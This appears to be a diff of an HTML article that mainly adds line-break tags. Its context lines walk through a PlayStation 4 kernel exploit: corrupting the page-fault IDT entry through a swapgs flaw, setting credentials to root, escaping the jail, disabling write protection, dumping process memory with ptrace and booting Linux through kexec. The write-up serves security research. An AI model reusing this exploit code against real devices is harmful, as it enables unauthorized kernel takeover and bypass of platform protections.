@@ -109,6 +109,8 @@ memcpy(writableAddress, loop, sizeof(loop));
 
 ((void (*)())executableAddress)();</code></pre>
 				
+				<br>
+				
 				<p>
 					The one limitation of this is that a segfault will be triggered if a <code>syscall</code> instruction is executed within JIT shared memory. To perform system calls we just do a jump to a <code>syscall</code> instruction from <code>libkernel</code>; just like how we performed system calls from ROP.
 				</p>
@@ -139,6 +141,8 @@ else if(codeExecutionStage == "4") {
 	setTimeout(function() { document.cookie = "codeExecutionStage=0"; location.reload(); }, 10);
 }</code></pre>
 				
+				<br>
+					
 				<p>
 					Since we're using the JIT system calls for their intended purpose, it's not really an exploit, just a neat trick.
 				</p>
@@ -164,6 +168,8 @@ else if(codeExecutionStage == "4") {
 				
 				<pre><code>mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code></pre>
 				
+				<br>
+				
 				<p>
 					This is due to the <code>sysctl</code> flag, <code>security.bsd.map_at_zero</code>, being set to 0; attempting to change it to 1 will also fail:
 				</p>
@@ -174,6 +180,8 @@ else if(codeExecutionStage == "4") {
 	
 	return sysctlbyname("security.bsd.map_at_zero", NULL, 0, &amp;val, &amp;len);
 }</code></pre>
+				
+				<br>
 				
 				<p>
 					Since we have no way of controlling the memory at <code>NULL</code>, it would be unlikely that we can exploit any kernel <code>NULL</code> dereferences.
@@ -221,6 +229,8 @@ else if(codeExecutionStage == "4") {
 	return len;
 }</code></pre>
 				
+				<br>
+				
 				<p>
 					This results in several stacks (one for each thread), like the following:
 				</p>
@@ -232,6 +242,8 @@ else if(codeExecutionStage == "4") {
 #4 0xffffffff8244ee35 at umtx_thread_exit+0x13b5
 #5 0xffffffff82616735 at amd64_syscall+0x4c5
 #6 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
+				
+				<br>
 				
 				<p>
 					Not only does this give us an easy way to identify roughly how different some parts of the PS4 kernel are from FreeBSD, but it also leaks the addresses of some kernel functions which will be vital for exploitation later. Just in case you needed any more confirmation that there is no kernel ASLR, these function addresses are always the same across reboots.
@@ -261,6 +273,8 @@ sceNetSend(sock, buffer, size, 0);
 
 scePthreadCancel(thread);</code></pre>
 				
+				<br>
+				
 				<p>
 					Here is the resultant kernel call stack of the new thread:
 				</p>
@@ -279,6 +293,8 @@ scePthreadCancel(thread);</code></pre>
 #11 0xffffffff82616735 at amd64_syscall+0x4c5
 #12 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
 				
+				<br>
+				
 				<p>
 					This confirms that system call 532, <code>sys_regmgr_call</code>, executes a registry command, as predicted in <a href="ps4-2.html">my previous article</a>.
 				</p>
@@ -294,6 +310,8 @@ scePthreadCancel(thread);</code></pre>
 	
 	return (0);
 }</code></pre>
+				
+				<br>
 				
 				<pre><code>sys_getpid:
 	mov     rax, [rdi+8]
@@ -346,6 +364,8 @@ int amd64_set_gsbase(void *base) {
 	return sysarch(AMD64_SET_GSBASE, &amp;base);
 }</code></pre>
 				
+				<br>
+				
 				<p>
 					Any writes which the kernel performs relative to the <code>GS</code> base can be controlled after the vulnerable <code>swapgs</code>.
  				</p>
@@ -368,6 +388,8 @@ int amd64_set_gsbase(void *base) {
 				<pre><code>sudo apt-get install build-essential
 sudo apt-get install libncurses5-dev</code></pre>
 				
+				<br>
+				
 				<p>
 					And install <code>gdb-amd64-marcel-freebsd</code> as explained.
 				</p>
@@ -379,6 +401,8 @@ sudo apt-get install libncurses5-dev</code></pre>
 				<pre><code>gdb-amd64-marcel-freebsd -q -tui kernel/kernel
 set architecture i386:x86-64
 target remote localhost:8864</code></pre>
+				
+				<br>
 				
 				<p>
 					Another option is to use the remote gdb feature within IDA Pro.
@@ -421,6 +445,8 @@ target remote localhost:8864</code></pre>
 	uint64_t base;
 } __attribute__((packed));</code></pre>
 				
+				<br>
+				
 				<p>
 					With the IDT base, we can calculate the address of the function pointer to the page fault handler (<code>#PF</code> is entry 14 in the IDT):
 				</p>
@@ -449,6 +475,8 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 	inc dword [rax+0x3cc] ; td->td_critnest++;
 	ret</code></pre>
 				
+				<br>
+				
 				<p>
 					Since kernel memory is based at <code>0xffffffff80000000</code> in the virtual address space, kernel function pointers have an upper four bytes of <code>0xffffffff</code>. If <code>(*gs)+0x3cc</code> points to the upper four bytes of a kernel pointer, the value will overflow from <code>0xffffffff</code> to <code>0x00000000</code>, effectively corrupting it into a userland pointer.
 				</p>
@@ -458,6 +486,8 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 				</p>
 				
 				<pre><code>gsBase[0] = xpageEntryHi - 0x3cc;</code></pre>
+				
+				<br>
 				
 				<p>
 					This is how the <code>critical_enter</code> write will affect the <code>#PF</code> entry in the IDT (bytes in bold are used by the address):
@@ -484,6 +514,8 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 				
 				<pre><code>FFFFFFFF80823368: mov rax, [r12+18h]</code></pre>
 				
+				<br>
+				
 				<p>
 					Since <code>r12</code> contains <code>0</code>, a read from the unmapped address <code>0x18</code> will be performed, resulting in a jump to the page fault handler (which now points to our userland address).
 				</p>
@@ -493,6 +525,8 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 				</p>
 				
 				<pre><code>#SS exception -> Corrupt #PF handler -> #PF exception -> Our payload</code></pre>
+				
+				<br>
 				
 				<p>
 					In x86 <a href="https://en.wikipedia.org/wiki/Triple_fault">a triple fault</a> will cause a reboot. We need to take precautions to prevent any further faults from occurring and crashing the system. Mainly, we need to ensure that any user memory we access in the payload won't cause a further page fault.
@@ -546,11 +580,15 @@ cred = td->td_proc->p_ucred;
 cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
 cred->cr_groups[0] = 0;</code></pre>
 				
+				<br>
+				
 				<p>
 					On the PS4, our process is also in a <a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD jail</a>, so we'll also need to perform a <i>jailbreak</i>:
 				</p>
 				
 				<pre><code>cred->cr_prison = &amp;prison0;</code></pre>
+				
+				<br>
 				
 				<p>
 					This causes the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_jail.c#L3390"><code>jailed</code></a> check to return 0.
@@ -566,6 +604,8 @@ uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
 uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 *td_fdp_fd_rdir = *rootvnode;
 *td_fdp_fd_jdir = *rootvnode;</code></pre>
+				
+				<br>
 				
 				<p>
 					As mentioned earlier, Sony added a few additional privilege checks to the PS4 kernel, such as whether the current process has permission to use the JIT system calls, access the registry, send debug messages over UART, etc. I won't go over how to disable all of these checks, but once you've dumped the kernel, they are trivial to bypass; just search for <code>sceSblACMgr</code>.
@@ -584,6 +624,8 @@ uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 				
 				<pre><code>*((int *)XpageEntryHi) = 0xffffffff;</code></pre>
 				
+				<br>
+				
 				<p>
 					We can verify that the page fault entry is correctly restored by triggering a page fault and seeing where the debugger jumps:
 				</p>
@@ -591,12 +633,16 @@ uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 				<pre><code>char *p = NULL;
 *p = 0;</code></pre>
 				
+				<br>
+				
 				<p>
 					However, if we dump the nearby memory before and after triggering the exploit (<code>(gdb) x /512bx  0xffffffff81183c7c</code>), we will find that a few other bytes were corrupted too. For example:
 				</p>
 								
 				<pre><code>0xffffffff81184048 before: 0xff 0xff 0xff 0xff 0x00 0x00 0x00 0x00
 0xffffffff81184048 after:  0xff 0xff 0xff 0xff 0x01 0x00 0x00 0x00</code></pre>
+				
+				<br>
 				
 				<p>
 					Simply write back the all values which were changed, and the system should be ready to continue execution gracefully.
@@ -653,6 +699,8 @@ uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 FreeBSD Xfast_syscall: 0xFFFFFFFF80B03330
 Difference: 0xf0</code></pre>
 				
+				<br>
+				
 				<p>
 					Subtracting <code>0xf0</code> from the address of <code>Xfast_syscall</code> gives us <code>0xFFFFFFFF825FF170</code>, which should either be perfect, or an accurate enough estimate. Knowing the exact address of <code>Xpage</code> is not necessary. By mapping a large NOP slide in userland, we only need to guess the general range the function is in.
 				</p>
@@ -685,7 +733,9 @@ Found non-zero memory at offset 3d8
 Found non-zero memory at offset 3cc
 Found non-zero memory at offset 3d0
 Found non-zero memory at offset 3d8</code></pre>
-
+				
+				<br>
+				
 				<p>
                     However, we had less luck running this same code on the PS4.  We could only guess that the system crashed more quickly, and the kernel didn't have enough time to send these packets.
 				</p>
@@ -735,6 +785,8 @@ Found non-zero memory at offset 3d8</code></pre>
 #8 0xffffffff8249ec69 at sys_sendto+0x59
 #9 0xffffffff82616735 at amd64_syscall+0x4c5
 #10 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
+				
+				<br>
 				
 				<p>
 					We can use <code>sys_sendto</code> directly from the kernel without needing to restore the system to a fully stable state.
@@ -813,6 +865,8 @@ setidt(IDT_DB, 0xFFFFFFFF825FECB0, SDT_SYSIGT, SEL_KPL, 0);
 setidt(IDT_NMI, 0xFFFFFFFF825FF3E0, SDT_SYSIGT, SEL_KPL, 2);
 ...</code></pre>
 				
+				<br>
+				
 				<p>
 					However, if you plan to release any kernel code, I would advise you to dynamically resolve these function addresses at runtime as demonstrated by fail0verflow in their <a href="https://github.com/fail0verflow/ps4-kexec/blob/master/kernel.c">kexec system call implementation</a>.
 				</p>
@@ -832,6 +886,8 @@ setidt(IDT_NMI, 0xFFFFFFFF825FF3E0, SDT_SYSIGT, SEL_KPL, 2);
 original_fo_chmod = socketops->fo_chmod;
 socketops->fo_chmod = payload;</code></pre>
 				
+				<br>
+				
 				<p>
 					After returning to userland, we can now re-enter the kernel by using the <code>fchmod</code> system call to trigger our second payload:
 				</p>
@@ -845,6 +901,8 @@ if(s > 0) {
 else printf("Failed to allocate socket\n");
 
 sceNetSocketClose(s);</code></pre>
+				
+				<br>
 				
 				<p>
 					We have a lot more freedom in this context, and can easily restore the original handler when finished:
@@ -880,6 +938,8 @@ int payload(void *fp, int mode, void *active_cred, struct thread *td) {
 [+] Entered main payload
 [+] Entered critical payload
 [+] Entered shellcode</code></pre>
+				
+				<br>
 				
 				<p>
 					There are many potential explanations for what causes this, including some form of cache incoherency between processors, or preemption of the kernel task before the IDT is fixed.
@@ -927,6 +987,8 @@ writeCr0(cr0 &amp; ~X86_CR0_WP);
 // Restore write protection
 writeCr0(cr0);</code></pre>
 				
+				<br>
+				
 				<p>
 					<i>The above code uses AT&amp;T syntax x86 assembly.</i>
 				</p>
@@ -973,6 +1035,8 @@ cnputc(int c) {
 	...
 }</code></pre>
 				
+				<br>
+				
 				<p>
 					Both places check the value returned from <code>bootparam_disable_console_output</code> before disabling console output, which is implemented as follows:
 				</p>
@@ -983,6 +1047,8 @@ bootparam_disable_console_output()
 	return (unsigned int)(*(uint16_t *)0xFFFFFFFF833242F6) >> 15;
 }</code></pre>
 				
+				<br>
+				
 				<p>
 					So to disable this check, we just need to clear bit 15 of this variable in our payload:
 				</p>
@@ -990,6 +1056,8 @@ bootparam_disable_console_output()
 				<pre><code>// bootparam_disable_console_output = 0
 uint16_t *bootParams = (uint16_t *)0xFFFFFFFF833242F6;
 *bootParams &amp;= ~(1 &lt;&lt; 15);</code></pre>
+				
+				<br>
 				
 				<p>
 					If you search for xrefs to this variable, you'll notice that it's also used in the checks for <code>sceSblRcMgrIsAllowDisablingAslr</code>, <code>sceSblRcMgrIsAllowRegistryAccess</code> and many more.
@@ -1047,6 +1115,8 @@ else if(len > 0) {
 	printf("  [+] PID %d, name: %s, thread: %s\n", pid, name, thread);
 }</code></pre>
 				
+				<br>
+				
 				<p>
 					A list of all processes was also posted in my <a href="https://gist.github.com/CTurt/27fe7f3c241f69be19e5">recent gist</a>.
 				</p>
@@ -1057,12 +1127,14 @@ else if(len > 0) {
 				
 				<pre><code>if(strcmp(name, "eboot.bin") == 0) patchPid = pid;</code></pre>
 				
+				<br>
+				
 				<p>
 					The next stage is to read all mappings from the target process, which can be done with the <code>KERN_PROC_VMMAP</code> name of <code>sysctl</code>. Due to ASLR, the addresses of mappings will always be different, so you should read them dynamically.
 				</p>
 				
 				<p>
-					Once you've identified a mapping you want to dump, you can use <a href="https://www.freebsd.org/cgi/man.cgi?query=ptrace&apropos=0&sektion=2&manpath=FreeBSD+9.0-RELEASE&arch=amd64&format=html">ptrace</a> to read it:
+					Once you've identified a mapping you want to dump, you can use <a href="https://www.freebsd.org/cgi/man.cgi?query=ptrace&amp;apropos=0&amp;sektion=2&amp;manpath=FreeBSD+9.0-RELEASE&amp;arch=amd64&amp;format=html">ptrace</a> to read it:
 				</p>
 				
 				<pre><code>int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
@@ -1083,6 +1155,8 @@ for(offset = mappingAddress; offset &lt; mappingAddress + mappingSize; offset +=
 	int ret = ptrace(PT_IO, pid, &amp;pt_desc, NULL);
 	if(!ret) sceNetSend(sock, readbuf, pt_desc.piod_len, 0);
 }</code></pre>
+				
+				<br>
 				
 				<p>
 					However, when using <code>ptrace</code> to access the memory of another process, we encountered issues where the process would immediately restart after finishing with reading or writing. This would cause any patches to be lost.
@@ -1121,6 +1195,8 @@ memcpy(DT_HASH_SEGMENT, kexec, kexecSize);
 void (*kexec_init)(void *, void *) = DT_HASH_SEGMENT;
 kexec_init(NULL, NULL);</code></pre>
 				
+				<br>
+				
 				<p>
 					Once you return to userland, you can load the kernel and initramfs from USB, pass them to <code>kexec</code>, and finally reboot!
 				</p>
@@ -1145,6 +1221,8 @@ int evf = syscall(540, "SceSysCoreReboot");
 syscall(546, evf, 0x4000, 0);
 syscall(541, evf);
 syscall(37, 1, 30);</code></pre>
+				
+				<br>
 				
 				<p>
 					A compiled version of the <a href="dlclose-overflow.html">dlclose exploit</a>, with a payload which boots Linux from USB has been added to the <a href="https://github.com/CTurt/PS4-playground">PS4-playground</a>.
